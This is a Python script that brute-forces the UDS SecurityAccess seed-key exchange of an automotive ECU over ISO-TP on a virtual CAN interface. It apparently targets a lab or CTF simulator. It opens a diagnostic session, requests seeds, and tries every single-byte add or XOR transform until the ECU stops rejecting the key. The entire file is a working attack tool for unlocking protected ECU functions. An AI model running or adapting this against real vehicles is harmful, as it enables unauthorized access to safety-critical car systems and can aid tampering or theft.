import can
import isotp
import time

tp = isotp.socket(3) # 3=timeout
tp.set_fc_opts(stmin=5, bs=10) # https://can-isotp.readthedocs.io/en/latest/isotp/socket.html
tp.bind('vcan0', isotp.Address(rxid=0x7e8, txid=0x7e0, addressing_mode=0))

LEVEL = 0x1 # 0x3
SEED_LENGTH = 4

def openSession():
    tp.send(bytearray([0x10, 0x03]))
    tp.recv()

def TesterPresent():
    tp.send(bytearray([0x3E]))
    return tp.recv()

def getSeed():

    tp.send(bytearray([0x27, LEVEL]))
    seed = tp.recv()
    return seed[2:]

def keyCalculation(seed, X=0, Y=0):
    seed = seed.hex()
    #for i in range(SEED_LENGTH):
    b1 = int(seed[0:2],16)
    b2 = int(seed[2:4],16)
    b3 = int(seed[4:6],16)
    b4 = int(seed[6:8],16)
    
    seed = int(seed, 16)

    # Single byte XOR (^ X) OK FOR LEVEL 1 (UserSpaceDiag)
    #key_1 = hex(b1 ^ X)[2:] 
    #key_2 = hex(b2 ^ X)[2:]
    #key_3 = hex(b3 ^ X)[2:]
    #key_4 = hex(b4 ^ X)[2:]
    #key = int(key_1 + key_2 + key_3 + key_4, 16)
    #key = key.to_bytes(4, 'big')

    key_1 = hex((b1 + X) & 0xFF)[2:] # +, ^, ~, &, |, *
    key_2 = hex((b2 + X) & 0xFF)[2:]
    key_3 = hex((b3 + X) & 0xFF)[2:]
    key_4 = hex((b4 + X) & 0xFF)[2:]
    key = int(key_1 + key_2 + key_3 + key_4, 16)
    key = key.to_bytes(4, 'big')

    # Two byte XOR (middle bytes)
    #key_1 = hex(b1)[2:] 
    #key_2 = hex(b2 ^ X)[2:]
    #key_3 = hex(b3 ^ Y)[2:]
    #key_4 = hex(b4)[2:]
    #key = int(key_1 + key_2 + key_3 + key_4, 16)
    #key = key.to_bytes(4, 'big')

    return key

def myECUReset():
    tp.send(bytearray([0x11, 0x01]))
    resp = tp.recv()
    return resp

def SendKey():

    for X in range(1,256):
        #for Y in range(1,256):
        seed = getSeed()
        if X % 5 == 0:
            print(TesterPresent().hex())
            #print(myECUReset().hex())
        key = keyCalculation(seed, X)
        print(key.hex())
        time.sleep(0.5) # !! IMPORTANT !! #

        #Send Key (LEVEL)
        tp.send(bytearray([0x27, LEVEL+1, key[0],key[1],key[2],key[3]]))
        if "7f2735" != tp.recv().hex():
            print("********** WINNNNN ************")
            return
    
def main():
    openSession()
    SendKey()

if __name__ == '__main__':
    main()